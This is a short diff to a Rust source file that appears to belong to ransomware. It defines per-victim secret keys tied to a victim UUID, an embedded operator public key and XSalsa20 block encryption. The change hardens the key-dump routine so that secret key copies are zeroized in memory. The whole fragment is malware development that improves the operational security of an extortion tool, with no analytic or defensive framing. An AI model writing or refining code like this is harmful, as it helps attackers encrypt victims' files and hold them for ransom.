@@ -14,6 +14,7 @@ use salsa20::XSalsa20;
 use sha2::{Digest, Sha256};
 use uuid::Uuid;
 use zeroize::Zeroize;
+use zeroize::Zeroizing;
 
 const BLOCK_SIZE: usize = 1024 * 1024;
 static OPERATOR_PUBLIC_KEY: &'static [u8; 32] = include_bytes!("../assets/operator_public_key.bin");
@@ -41,13 +42,13 @@ impl PerVictimKey {
     pub fn generate(victim_id: &Uuid) -> Self {
         Self::new(&victim_id, dryocbox::SecretKey::gen())
     }
-    pub fn dump(self: &Self) -> Vec<u8> {
-        // Note: with_capacity is important! Otherwise we would have to zeroize the secret key.
-        let mut serialized =
-            Vec::with_capacity(self.victim_id.as_bytes().len() + self.secret_key.len());
-        serialized.extend_from_slice(self.victim_id.as_bytes());
-        serialized.extend_from_slice(&self.secret_key);
-        serialized
+    pub fn dump(self: &Self) -> Zeroizing<Vec<u8>> {
+        // Note: with_capacity is important! Otherwise we may fail to zeroize all copies of the key.
+        let mut ret: Zeroizing<Vec<u8>> =
+            Vec::with_capacity(self.victim_id.as_bytes().len() + self.secret_key.len()).into();
+        ret.extend_from_slice(self.victim_id.as_bytes());
+        ret.extend_from_slice(&self.secret_key);
+        ret
     }
     pub fn parse(data: &[u8]) -> Option<Self> {
         if data.len() != 48 {
